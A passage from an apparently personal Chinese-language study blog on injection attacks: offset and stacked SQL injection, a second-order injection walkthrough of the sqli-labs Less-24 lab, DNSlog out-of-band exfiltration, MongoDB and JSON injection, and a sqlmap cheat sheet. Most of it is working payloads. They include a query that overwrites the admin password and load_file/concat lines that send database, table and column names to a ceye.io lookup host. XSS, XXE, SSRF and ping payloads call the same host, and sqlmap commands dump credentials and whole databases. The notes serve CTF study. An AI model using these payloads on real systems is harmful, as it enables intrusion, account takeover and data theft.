即1,2,3,admin.*,4,5,6</code></p><p>特：</p><blockquote><p>在某些情况下，通过偏移注入，我们获取不到想要的数据怎么办，</p><p>假设表中存在id字段</p><p>首先给表重命名 admin as a   admin as b</p><p>获取id 一样的字段 admin as a inner join admin as b on a.id&#x3D;b.id 这样做我们可以打乱随机顺序，不过这样之后作为一个整体查询，字段数要乘以2</p><p>payload：union select 1,2,(admin as a inner join admin as b on a.id&#x3D;b.id).* from admin</p></blockquote><p>5.爆列名数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一级偏移语句：</span><br><span class="line"></span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)</span><br><span class="line"></span><br><span class="line">如果你发现，上面查看了网页源码也爆不出数据，请用以下方法：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二级偏移语句：</span><br><span class="line"></span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join a</span><br></pre></td></tr></table></figure><p>偏移注入的基本公式为:<br> order by 出的字段数减去号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="前置-3"><a href="#前置-3" class="headerlink" title="前置"></a>前置</h2><p>可以同时执行多条语句的执行时的注入</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束</p><p>堆叠注入可以执行的是任意的语句 而union injection执行的语句类型是有限的，可以用来执行查询语句</p><h2 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h2><p>更新id&#x3D;1的用户密码为123456</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;;update users set password=&#x27;123456&#x27; where id=1; --+ </span><br></pre></td></tr></table></figure><p>还可以用于删库等一系列sql命令，不止局限于查询</p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p>第一次注入 第二次触发</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d07042.png" alt="image-20240306192751893"></p><p>第一次的注入语句中的某些符号被转义了，但是仍被存储在数据库中，此时数据库中的注入语句的转义符是不会被存储进来的（即存储在数据库中的注入语句是完整的，只是尚未被拼接在SQL语句中）</p><p>第二次会请求第一次注入的数据，去执行SQL相关命令，此时因为程序可能认为已存储在数据库中的数据是安全的，就会直接调用其数据，并未对其进行转义等处理，使第一次的注入语句被完整调用，实现注入</p><h2 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h2><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p><p>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p><p>使用实例：</p><p>sqli-labs less-24</p><ol><li>如下点击注册用户</li></ol><p><img src="https://bu.dusays.com/2024/05/13/6641605a5e0bd.png" alt="image-20240306194217405"></p><p>这里注册用户名为 admin’#</p><p><img src="https://bu.dusays.com/2024/05/13/6641605a595ad.png" alt="image-20240306194232085"></p><p>此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD</p><p><img src="https://bu.dusays.com/2024/05/13/6641605a6ca0b.png" alt="image-20240306194249406"></p><ol start="2"><li>对注册的账号进行登录然后修改密码为ccccc</li></ol><p><img src="https://bu.dusays.com/2024/05/13/6641605cacf82.png" alt="image-20240306194314534"></p><p>此时提示密码已经成功修改了</p><p><img src="https://bu.dusays.com/2024/05/13/6641605a52e7a.png" alt="image-20240306194328535"></p><p>此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin’#的密码并没有被修改</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b1b9c4.png" alt="image-20240306194343196"></p><p>漏洞原因</p><ol><li><p>在进行用户注册的允许存在’和#这种特殊字符</p></li><li><p>在修改密码页面的源码中，发现这里很明显存在注入漏洞</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>当我们登录账号admin’#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><h1 id="DNSlong注入"><a href="#DNSlong注入" class="headerlink" title="DNSlong注入"></a>DNSlong注入</h1><h2 id="前置-4"><a href="#前置-4" class="headerlink" title="前置"></a>前置</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据</p><h3 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h3><p>一般情况下，在我们无法通过联合查询直接获取数据的情况下，我们只能通过盲注，来一步步的获取数据，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，此时就可以使用dnslong带外注入</p><h3 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h3><p>mysql中有个系统属性  secure_file_priv</p><blockquote><p>secure_file_priv为null    表示不允许导入导出 </p><p>secure_file_priv指定文件夹时  表示mysql的导入导出只能发生在指定的文件夹 </p><p>secure_file_priv没有设置时  则表示没有任何限制</p></blockquote><blockquote><p>LOAD_FILE()函数 </p><p>LOAD_FILE()函数读取一个文件并将其内容作为字符串返回 语法为：load_file(file_name)，其中file_name是文件的完整路径</p><p>使用条件：</p><p>文件必须位于服务器主机上<br>你必须具有该FILE权限才能读取该文件。拥有该FILE权限的用户可以读取服务器主机上的任何文件，该文件是world-readable的或MySQL服务器可读的，此属性与secure_file_priv状态相关<br>文件必须是所有人都可读的，并且它的大小小于max_allowed_packet字节</p></blockquote><p>UNC路径</p><blockquote><p>什么是UNC路径？</p><p>UNC路径就是类似\softer这样的形式的网络路径。它符合 \servername\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p><p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。</p><p>例如把自己电脑的文件共享，你会获得如下路径，这就是UNC路径</p><p>&#x2F;&#x2F;iZ53sl3r1890u7Z&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;111.txt</p><p><strong>这也就解释了为什么CONCAT()函数拼接了4个\了，双斜杠表示网络资源路径多加两个\就是转义了反斜杠。</strong></p></blockquote><blockquote><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p><p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>2、当secure_file_priv为G:\，就可以读取G盘的文件。<br>3、当secure_file_priv为null，load_file就不能加载文件。</p></blockquote><p>使用DNSlog注入需要使用一个dns服务器用于记录我们注入的信息并返回一些有用的信息（类似于日志）</p><blockquote><p>DNSLOG平台 </p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a>  （是临时的网址）</p><p><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a> （不常用了）</p><p><a href="http://ceye.io/">http://ceye.io</a> （要注册）</p></blockquote><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="https://bu.dusays.com/2024/05/13/6641605b4a234.png" alt="image-20240306211208664"></p><p><img src="https://bu.dusays.com/2024/05/13/6641605e22ff7.png" alt="image-20240306211243870"></p><p>我们注入的指令会被服务器发送给NS服务器 并被记录下来</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>需要Mysql用户具备文件读取的权限，因为要借助到mysql的load_file读取文件的函数，权限不够的话，不能调用这个函数，其实只要mysql配置项中开启了secure_file_priv配置，就可以通过sql语句来执行文件读写操作</li><li>目标mysql数据库服务器能访问外网</li></ul><h2 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h2><h3 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;\\\\requests.xxxx.ceye.io\\aa&#x27;);</span><br><span class="line">select load_file(&#x27;\\\\xxxx.xxxx.xxx\\xx&#x27;);  xxxx.xxxx.xxx\\xx是某个网址</span><br><span class="line">这是最基本的用法，来看看利用盲注来回显。</span><br></pre></td></tr></table></figure><p>利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">或者构造</span><br><span class="line">payload：&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxx.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure><p>查库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from member where id=1 and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.xxxx.xxx.xxx/xx&#x27;)))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from member where id=1 and (select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxx.xxx.xxx\\xx&#x27;)))</span><br></pre></td></tr></table></figure><p>查表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆第一个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br><span class="line">爆第二个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br><span class="line">爆第三个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 2,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br></pre></td></tr></table></figure><p>查字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select column_name from information_schema.column where table_schema=database() and table_name=&#x27;member&#x27; limit 0,1),&#x27;.xxx.xxx.xx\\xx&#x27;)))</span><br></pre></td></tr></table></figure><h3 id="配合xss"><a href="#配合xss" class="headerlink" title="配合xss"></a>配合xss</h3><p>XSS 盲打在安全测试的时候是比较常用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot;&lt;script src=http://XSS.XXXXX.ceye.io&gt;&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="配合SSRF"><a href="#配合SSRF" class="headerlink" title="配合SSRF"></a>配合SSRF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot;... &lt;!ENTITY test SYSTEM &quot;SSRF.xxxx.ceye.io\\aa&quot;&gt; ...&quot;</span><br></pre></td></tr></table></figure><h3 id="配合XXE"><a href="#配合XXE" class="headerlink" title="配合XXE"></a>配合XXE</h3><p>当我们遇到XXE，如果这个XXE漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把dtd文件改成这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://XXXX.ceye.io/%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><h3 id="配合命令执行"><a href="#配合命令执行" class="headerlink" title="配合命令执行"></a>配合命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot; ping %PATH%.pxxx.ceye.io ...&quot;</span><br></pre></td></tr></table></figure><h1 id="MongoDB-注入"><a href="#MongoDB-注入" class="headerlink" title="MongoDB 注入"></a>MongoDB 注入</h1><p>要考 遇到了再学 先放在这里   已学</p><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>MongoDB是一个基于分布式文件存储的数据库，是一个介于关系数据库和非关系数据库之间的产品，它的特点是高性能、易部署、易使用，存储数据非常方便，默认情况下是没有认证的这就导致不熟悉它的研发人员部署后没有做访问控制导致可以未授权登录。</p><p><strong>MongoDB 与几乎支持相同语法的SQL数据库相反，NoSQL数据库具有不同的语法。</strong></p><p>实现MongoDB 注入：</p><p>在登录时，如果是mysql这种关系型的数据库，我们可以构造真值等式来绕过。如 or 1&#x3D;1。 在nosql中同样可以，nosql中的 || 1&#x3D;&#x3D;1 相当于在sql中的 or 1&#x3D;1 。 那么我们可以这样绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=fujieace&#x27; || 1==1 //</span><br></pre></td></tr></table></figure><p>在攻击前，我们需要先建立一个集合，作为攻击的基础。</p><p>用户test是攻击者已经知道账号密码的一个测试账号，其他账号的话密码随机。想通过注入获取其他账号的密码。</p><h2 id="1-数组绑定时的注入"><a href="#1-数组绑定时的注入" class="headerlink" title="1.数组绑定时的注入"></a>1.数组绑定时的注入</h2><p>一个数组绑定的查询demo如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">&lt;?php</span><br><span class="line">$mongo = new mongoclient();</span><br><span class="line">$db = $mongo-&gt;myinfo; //选择数据库</span><br><span class="line">$coll = $db-&gt;test; //选择集合</span><br><span class="line">$username = $_GET[&#x27;username&#x27;];</span><br><span class="line">$password = $_GET[&#x27;password&#x27;];</span><br><span class="line">$data = array(</span><br><span class="line">        &#x27;username&#x27;=&gt;$username,</span><br><span class="line">        &#x27;password&#x27;=&gt;$password</span><br><span class="line">        );</span><br><span class="line">$data = $coll-&gt;find($data);</span><br><span class="line">$count = $data-&gt;count();</span><br><span class="line">if ($count&gt;0) &#123;</span><br><span class="line">    foreach ($data as $user) &#123;</span><br><span class="line">        echo &#x27;username:&#x27;.$user[&#x27;username&#x27;].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo &#x27;password:&#x27;.$user[&#x27;password&#x27;].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;未找到&#x27;;</span><br></pre></td></tr></table></figure><p>此时的攻击利用了php可以传递数组参数的一个特性。</p><p>当传入的url为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username=test&amp;password=test</span><br></pre></td></tr></table></figure><p>执行了语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:‘test’,password:‘test’&#125;);</span><br></pre></td></tr></table></figure><p>如果此时传入的url如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[xx]=test&amp;password=test</span><br></pre></td></tr></table></figure><p>则$username就是一个数组，也就相当于执行了php语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">$data = array(</span><br><span class="line">&#x27;username&#x27;=&gt;array(&#x27;xx&#x27;=&gt;&#x27;test&#x27;),</span><br><span class="line">&#x27;password&#x27;=&gt;&#x27;test&#x27;);</span><br></pre></td></tr></table></figure><p>此时的攻击利用了php可以传递数组参数的一个特性。</p><p>当传入的url为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username=test&amp;password=test</span><br></pre></td></tr></table></figure><p>执行了语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#x27;test&#x27;,password:&#x27;test&#x27;&#125;);</span><br></pre></td></tr></table></figure><p>如果此时传入的url如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[xx]=test&amp;password=test</span><br></pre></td></tr></table></figure><p>则$username就是一个数组，也就相当于执行了php语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">$data = array(</span><br><span class="line">&#x27;username&#x27;=&gt;array(&#x27;xx&#x27;=&gt;&#x27;test&#x27;),</span><br><span class="line">&#x27;password&#x27;=&gt;&#x27;test&#x27;);</span><br></pre></td></tr></table></figure><p>而mongodb对于多维数组的解析使最终执行了如下语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#123;&#x27;xx&#x27;:&#x27;test&#x27;&#125;,password:&#x27;test&#x27;&#125;);</span><br></pre></td></tr></table></figure><p>利用此特性，我们可以传入数据，是数组的键名为一个操作符（大于，小于，等于，不等于等等），完成一些攻击者预期的查询。</p><p>如，传入url:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[$ne]=test&amp;password[$ne]=test</span><br></pre></td></tr></table></figure><p>因为传入的键名$ne正是一个mongodb操作符，最终执行了语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#123;&#x27;$ne&#x27;:&#x27;test&#x27;&#125;,password:&#123;&#x27;$ne&#x27;:&#x27;test&#x27;&#125;&#125;);</span><br></pre></td></tr></table></figure><p>这句话相当于sql:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where username!=&#x27;test&#x27; and password!=&#x27;test&#x27;;</span><br></pre></td></tr></table></figure><p>如果此时的用户名与密码不能回显，只是返回一个逻辑上的正误判断。</p><p>那么我们可以采用$regex操作符来一位一位获取数据。</p><h2 id="2-拼接字符串时的注入"><a href="#2-拼接字符串时的注入" class="headerlink" title="2.拼接字符串时的注入"></a>2.拼接字符串时的注入</h2><p>攻击方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&amp;password=test</span><br></pre></td></tr></table></figure><p>报错。 想办法闭合语句。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:1,password:2&#125;//&amp;password=test</span><br></pre></td></tr></table></figure><p>该语句能返回一个数组，username键值是1，password键值是2.</p><p>爆mongodb版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test</span><br></pre></td></tr></table></figure><p>爆所有集合名</p><p>因为db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。并且mongodb函数区分大小写。</p><p>爆test集合的第一条数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.test.find()[0]),password:2&#125;;//&amp;password=test</span><br></pre></td></tr></table></figure><p>爆test集合的第二条数据</p><p>因为execute方法支持多语句执行，所以可以执行太多语句了，不演示~</p><p>当然，有时可能遇到没有输出返回数据，这时候怎么办呢？</p><p>在高版本下，添加了一个函数sleep()，就是时间盲注咯~</p><p>在高版本下，貌似不能用注释语句，此外高版本还有一个新特性就是默认开启错误回显。笔者尝试没有注释成功，只能用闭合的方法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);if (db.version() &gt; &quot;0&quot;) &#123; sleep(10000); exit; &#125;var b=(&#123;a:&#x27;1&amp;password=test</span><br></pre></td></tr></table></figure><h1 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h1><h2 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h2><p>把参数中转一下，再发送到指定网址上去，可以对请求携带的参数进行二次加工</p><p>有一说一 我感觉这只能是对题的见招拆招，说是一种单独的注入方式感觉有点草率了</p><p>这类题，会将我们注入的语句发送到指定网址进行一些处理（加密等）再发送出去</p><p>所以我们可以直接BP抓包发给重发器处理后发出去或这写一个php文件将数据直接进行相应的处理（用url拼接 file_get_contents读取文件 $_GET获取参数）然后直接访问这个文件进行传参，让这个文件来访问 注入成功可能会有回显</p><h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><p>好吧 感觉又是像中转注入一样 </p><p>伪静态：看似是静态页面实则是动态页面</p><p>伪静态 动态 静态在url上有差别</p><p><img src="https://bu.dusays.com/2024/05/13/6641605db649d.png" alt="image-20240306202112544"></p><p>伪静态的url可能会有数字等 让后端能明白要调用那个文件</p><p>剩下的就和正常的sql注入一样了</p><h2 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h2><p>也是几乎不考 先放在这里 考了再学</p><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>JSON是一种轻量级的数据交换格式，易于阅读和编写，同时也易于机器解析和生成。它是基于JavaScript的一个子集，JSON采用完全独立于语言的文本格式，但是也使用类似于C语言家族的习惯（C、C#、C++、Java、JavaScript、Perl、Python等都可以使用JSON），这些特性使JSON成为理想的数据交换语言。<br>JSON可以将JavaScript中的对象转换为字符串，然后在函数、网络之间传递这个字符串。</p><h3 id="2、JSON结构"><a href="#2、JSON结构" class="headerlink" title="2、JSON结构"></a>2、JSON结构</h3><p>JSON建构于两种结构：<br>①“名称&#x2F;值”对的集合。不同的语言中，它被理解为对象（object），纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。<br>②值的有序列表。在大部分语言中，它被理解为数组（array）。</p><p>例如：下面一段示例使JSON最简单的Key-Value示例（名称-值对，键值对）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;Username&quot;:&quot;xsser&quot;&#125;</span><br><span class="line">&#123;&quot;Username&quot;:&quot;xsser&quot;,&quot;Password&quot;:&quot;12345&quot;,&quot;Email&quot;:&quot;1234@st.com&quot;&#125;</span><br><span class="line"></span><br><span class="line">当需要表示一组值的时候，JSON不但能够提供高可读性，而且可以减少复杂性。</span><br><span class="line">例如表示一个管理员表，在JSON中，如下：</span><br><span class="line">&#123;&quot;Users&quot;:[</span><br><span class="line">&#123;&quot;Username&quot;:&quot;zhangsan&quot;,&quot;Password&quot;:&quot;12345&quot;,&quot;Email&quot;:&quot;12345@st.com&quot;&#125;</span><br><span class="line">&#123;&quot;Username&quot;:&quot;lisi&quot;,&quot;Password&quot;:&quot;123123&quot;,&quot;Email&quot;:&quot;123123@st.com&quot;&#125;</span><br><span class="line">&#123;&quot;Username&quot;:&quot;wangwu&quot;,&quot;Password&quot;:&quot;321321&quot;,&quot;Email&quot;:&quot;321321@st.com&quot;&#125;</span><br><span class="line">]  &#125;</span><br></pre></td></tr></table></figure><h3 id="3-JSON注入"><a href="#3-JSON注入" class="headerlink" title="3.JSON注入"></a>3.JSON注入</h3><p>JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。<br>在JSON中是根据引号（”）、冒号（:）、逗号（,）、花括号（{}）来区分各字符的意义的。如果向JSON中注入恶意字符，那么JSON将解析失败。<br>例如：输入的Password值为：admin”1，那么在JSON语句中为：“password”：“admin”1”，为了”password”：“admin”1”成功解析，我们可以把”admin”1”转换为”admin”1”。<br>JSON注入和XML注入、SQL注入一样，都需要对影响语句的内容进行转义，如双引号、花括号等。</p><h3 id="4-如何避免-JSON-注入"><a href="#4-如何避免-JSON-注入" class="headerlink" title="4.如何避免 JSON 注入"></a>4.如何避免 JSON 注入</h3><p>1、检查程序逻辑，根据实际需求对数据进行合理过滤和安全校验，以避免产生JSON注入。</p><p>2、后台代码对Json数据进行编码</p><p>JsonStringEncoder</p><p>3、使用安全json parser防止json注入</p><h1 id="SQLMAP使用"><a href="#SQLMAP使用" class="headerlink" title="SQLMAP使用"></a>SQLMAP使用</h1><p>首先，SQLMap是一个自动化的SQL注入工具</p><p>kali内自带SQLMAP，用-h参数查看sqlmap的参数与使用方法</p><p>kali中直接输入sqlmap即可使用</p><h2 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h2><p><img src="https://bu.dusays.com/2024/05/13/6641605eb068a.png" alt="image-20240309190754619"></p><h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r http.txt  #http.txt是我们抓取的http的请求包</span><br><span class="line">sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测</span><br><span class="line">sqlmap -u &quot;http://www.xx.com/username/admin*&quot;       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;   #探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;   --cookie=&quot;抓取的cookie&quot;   #当该网站需要登录时，探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;  --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;  #抓取其post提交的数据填入</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --users      #查看数据库的所有用户</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --passwords  #查看数据库用户名的密码</span><br><span class="line">有时候使用 --passwords 不能获取到密码，则可以试下</span><br><span class="line">-D mysql -T user -C host,user,password --dump  当MySQL&lt; 5.7时</span><br><span class="line">-D mysql -T user -C host,user,authentication_string --dump  当MySQL&gt;= 5.7时</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --current-user  #查看数据库当前的用户</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --is-dba    #判断当前用户是否有管理员权限</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --dbs        #爆出所有的数据库</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --tables     #爆出所有的数据表</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --columns    #爆出数据库中所有的列</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --current-db #查看当前的数据库</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --tables #爆出数据库security中的所有的表</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns #爆出security数据库中users表中的所有的列</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据</span><br><span class="line"> </span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --dump-all #爆出数据库security中的users表中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --dump-all   #爆出数据库security中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dump-all  #爆出该数据库中的所有数据</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u 